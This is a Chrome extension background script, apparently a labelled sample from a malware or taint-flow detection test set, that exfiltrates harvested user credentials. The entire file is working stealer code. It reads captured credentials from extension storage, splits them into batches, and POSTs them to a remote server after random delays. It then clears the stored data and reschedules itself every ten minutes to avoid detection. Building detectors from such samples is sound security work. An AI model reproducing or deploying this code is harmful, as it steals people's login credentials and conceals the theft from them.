// background.js - Batched exfiltration with delayed scheduling
// Frame: BG_1
//
// Flow patterns exercised:
//   1. STORAGE_DATA (harvested credentials) → [decode] → [batch] → FETCH_RESOURCE (DATA_LEAK)
//   2. CHROME_RUNTIME_ONMESSAGE → trigger exfiltration
//
// Attack techniques:
//   - Batched sending (split into small chunks)
//   - Delayed transmission (random delays between batches)
//   - Dynamic server URL (decoded from Base64)

import { getServerConfig, BATCH_DELAY, BATCH_SIZE } from "./config.js";
import { chunkArray } from "./utils.js";

let exfiltrationInProgress = false;
let exfiltrationTimer = null;

// ─── Message Handler ───────────────────────────────────────────────
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "CREDENTIAL_CAPTURED") {
    console.log(`[BG] Credentials captured: ${message.count}`);

    if (!exfiltrationInProgress && !exfiltrationTimer) {
      scheduleExfiltration();
    }
  }

  return true;
});

// ─── Schedule Exfiltration ─────────────────────────────────────────
function scheduleExfiltration() {
  const delay = 30000 + Math.random() * 30000;

  exfiltrationTimer = setTimeout(() => {
    exfiltrationTimer = null;
    startBatchedExfiltration();
  }, delay);
}

// ─── Batched Exfiltration ──────────────────────────────────────────
async function startBatchedExfiltration() {
  if (exfiltrationInProgress) return;

  exfiltrationInProgress = true;

  try {
    // SOURCE: Read from chrome.storage.local
    const result = await chrome.storage.local.get(["harvested"]);
    const harvested = result.harvested || [];                    // SOURCE STORAGE_DATA

    if (harvested.length === 0) {
      exfiltrationInProgress = false;
      return;
    }

    console.log(`[BG] Exfiltrating ${harvested.length} credentials in batches`);

    const batches = chunkArray(harvested, BATCH_SIZE);

    for (let i = 0; i < batches.length; i++) {
      await sendBatch(batches[i], i);

      if (i < batches.length - 1) {
        await sleep(BATCH_DELAY);
      }
    }

    await chrome.storage.local.remove(["harvested"]);
    console.log("[BG] Exfiltration complete, storage cleared");

  } catch (error) {
    console.error("[BG] Exfiltration error:", error);
  } finally {
    exfiltrationInProgress = false;
  }
}

// ─── Send Single Batch ─────────────────────────────────────────────
// SINK: FETCH_RESOURCE
async function sendBatch(batch, batchIndex) {
  const config = getServerConfig();
  const url = `${config.url}/${config.endpoint}`;

  const payload = {
    batch: batchIndex,
    count: batch.length,
    data: batch,
    timestamp: Date.now(),
    version: "2.1.0"
  };

  try {
    const response = await fetch(url, {                          // SINK FETCH_RESOURCE
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Client-Version": "2.1.0"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log(`[BG] Batch ${batchIndex} sent successfully`);
    } else {
      console.error(`[BG] Batch ${batchIndex} failed:`, response.status);
    }
  } catch (error) {
    console.error(`[BG] Network error for batch ${batchIndex}:`, error);
  }
}

// ─── Utility: Sleep ────────────────────────────────────────────────
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ─── Periodic Check ────────────────────────────────────────────────
setInterval(() => {
  if (!exfiltrationInProgress && !exfiltrationTimer) {
    chrome.storage.local.get(["harvested"], (result) => {
      if (result.harvested && result.harvested.length > 0) {
        scheduleExfiltration();
      }
    });
  }
}, 10 * 60 * 1000);
